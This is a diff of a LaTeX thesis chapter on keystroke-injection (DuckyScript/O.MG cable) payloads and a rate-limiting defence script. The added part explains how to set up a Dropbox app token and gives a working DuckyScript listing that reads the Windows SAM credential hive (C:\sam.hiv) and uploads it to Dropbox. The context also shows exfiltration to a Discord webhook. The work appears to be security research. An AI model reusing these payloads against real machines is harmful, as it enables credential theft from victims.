@@ -101,6 +101,8 @@ STRINGLN exit
 
 When gathering some information from the victim's laptop, the question arises of how this information can be forwarded to the attacker. While there is a myriad of possibilities for this, ranging from physical attraction to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
 One option to send out information is to send it to an already-established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this is that it looks very inconspicuous and will probably pass through firewalls.\\
+
+
 One example of sending an Extensible Markup Language (XML) object to a discord webhook given the webhook address and the content for the XML object:
 \begin{lstlisting}[caption={Send an XML object through PowerShell}, captionpos=b]
 STRING $xmlObject = [xml]$xmlContent
@@ -114,6 +116,22 @@ ENTER
 \end{lstlisting}
 
 This approach would also be possible with a custom server by replacing the webhook with the server address.
+
+Another possibility is to use Dropbox apps. This requires a Dropbox account. Once logegd in to the app concolse, a new app can be created. Before generating the access token, the file.content.write permissions have to be given to ensure that file can actually be uploaded. From there the DuckyScript code looks like this;
+
+\begin{lstlisting}[caption={Send any file to a Dropbox app}, captionpos=b]
+STRINGLN $accessToken = "<DROPBOX_ACCESS_TOKEN>"
+STRINGLN $file = "C:\sam.hiv"
+STRINGLN $authHeader = @{Authorization = "Bearer $accessToken"}
+STRINGLN $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+STRINGLN $dropboxFilePath = "/omg-test"
+STRINGLN $headers = @{}
+STRINGLN $headers.Add("Authorization", "Bearer $accessToken")
+STRINGLN $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+STRINGLN $headers.Add("Content-Type", "application/octet-stream")
+STRINGLN $fileContent = [System.IO.File]::ReadAllBytes($file)
+STRINGLN Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent
+\end{lstlisting}
 
 
 
@@ -434,5 +452,5 @@ The other option is to look at the time interarrival time, which is the time tha
 
 \section{Conclusion}
 
-This chapter discussed the implementation of the architectures introduced in chapter \ref{Methodology}. First it described the development of the novel payloads, detailing the approaches to their implementations and their basic repeating components. The second part of the chapter described the implementation of the the counterpart to the first part; the defense script. It described the mechansims behind the packet analysis and information extraction as well as the detail of the implementation for the two rate limiting methods; time window analysis and interarrival time analysis. In addition, it explained what external software the script depends on and how it can be used via command line. The next chapter will assess the effectiveness of the discussed implementations in achieving their goals.   
+This chapter discussed the implementation of the architectures introduced in chapter \ref{Methodology}. First, it described the development of the novel payloads, detailing the approaches to their implementations and their basic repeating components. The second part of the chapter describes the implementation of the counterpart to the first part; the defence script. It described the mechanisms behind the packet analysis and information extraction as well as the detail of the implementation for the two rate-limiting methods; time window analysis and interarrival time analysis. In addition, it explained what external software the script depends on and how it can be used via the command line. The next chapter will assess the effectiveness of the discussed implementations in achieving their goals.   
 
